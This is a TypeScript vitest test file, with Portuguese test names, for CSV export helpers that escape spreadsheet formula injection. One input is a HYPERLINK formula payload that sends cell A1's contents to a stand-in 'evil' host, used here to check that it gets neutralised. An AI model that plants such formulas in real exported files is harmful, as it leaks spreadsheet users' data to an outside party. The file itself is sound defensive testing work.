import { describe, expect, test } from "vitest"
import { csvCell, csvRow } from "./csv"

describe("csvCell", () => {
	test("neutraliza fórmula com apóstrofo", () => {
		expect(csvCell('=HYPERLINK("https://evil/?"&A1)')).toBe('"\'=HYPERLINK(""https://evil/?""&A1)"')
		expect(csvCell("+1+1")).toBe(`"'+1+1"`)
		expect(csvCell("-2+3")).toBe(`"'-2+3"`)
		expect(csvCell("@SUM(A1)")).toBe(`"'@SUM(A1)"`)
		expect(csvCell("\t=1")).toBe(`"'\t=1"`)
		expect(csvCell("\r=1")).toBe(`"'\r=1"`)
	})

	test("número é isento — inclusive o número já formatado em texto", () => {
		expect(csvCell(-3.5)).toBe('"-3.5"')
		expect(csvCell("-3.5000")).toBe('"-3.5000"')
		expect(csvCell("+10")).toBe('"+10"')
		expect(csvCell(Number.NaN)).toBe('""')
	})

	test("texto comum só ganha aspas; aspas internas são duplicadas", () => {
		expect(csvCell('Arroz "tipo 1", 5 kg')).toBe('"Arroz ""tipo 1"", 5 kg"')
		expect(csvCell("a=b")).toBe('"a=b"')
	})

	test("vazio", () => {
		expect(csvCell(null)).toBe('""')
		expect(csvCell(undefined)).toBe('""')
		expect(csvCell("")).toBe('""')
	})

	test("csvRow respeita o delimitador", () => {
		expect(csvRow(["a", 1, "=x"], ";")).toBe(`"a";"1";"'=x"`)
	})
})
